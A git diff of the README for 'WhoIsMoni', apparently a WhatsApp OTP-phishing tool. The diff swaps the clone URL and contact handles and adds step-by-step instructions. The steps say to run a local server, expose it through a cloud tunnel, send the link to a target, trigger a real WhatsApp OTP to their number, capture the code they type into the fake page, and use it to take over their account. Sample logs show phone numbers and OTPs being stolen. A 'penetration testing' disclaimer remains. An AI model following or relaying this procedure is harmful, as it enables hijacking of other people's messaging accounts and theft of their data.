@@ -17,7 +17,7 @@
 
 # Quick Start
 
-### git clone https://github.com/codingcreatively/WhoIsMoni.git
+### git clone https://github.com/VuppalaManikumar/WhoIsMoni.git
 ### cd WhoIsMoni
 ### pip install -r requirements.txt
 ### python3 whoismoni.py
@@ -35,7 +35,14 @@
 ### [2026-02-28 12:51:45] 📞 PHONE CAPTURED: +447123456789 (United Kingdom)
 ### [2026-02-28 12:52:01] 🔑 OTP STEAL: 123456 → +447123456789
 ### [2026-02-28 12:52:02] ✅ SESSION COMPLETE
-
+## HOW to USE THIS 
+#first run in 1st terminal of linux 
+#then click on start server {1}
+#then you get a local link and cloud warp link now copy the cloud warp link and paste in new terminal 
+#then you get a url that url should be copied and send to the respected person those who want to be hacked 
+#now open the original whatsapp and enter the persons whatsapp number and send the otp 
+#as the person enters the otp in the link you sent it will be appeared in the cmd 1
+#now the otp should be entered in the real whatsapp so get the whatsapp acccess  
 # Authorized Use Only
 
 ### ⚠️  STRICTLY FOR AUTHORIZED PENETRATION TESTING
@@ -44,15 +51,8 @@
 ### ⚠️  Educational/research purposes only
 ### ⚠️  Report all findings responsibly
 
-# How to use? Tutorial Video
-
-### https://youtu.be/x9vkXlCwbEQ
 
 # Contact
-### Instagram:- arcane.__01
-### Telegram:- @cashhustle_8
-
-# Join Now
-### Yotutuhe:- https://youtube.com/@cyberarcane8?si=ufFzu1ubtIzTrbHZ
-### Telegram Channel:- https://t.me/dealzone2888
+### Instagram:- manikumarvuppala
+### Telegram:- @manikumarvuppala
 
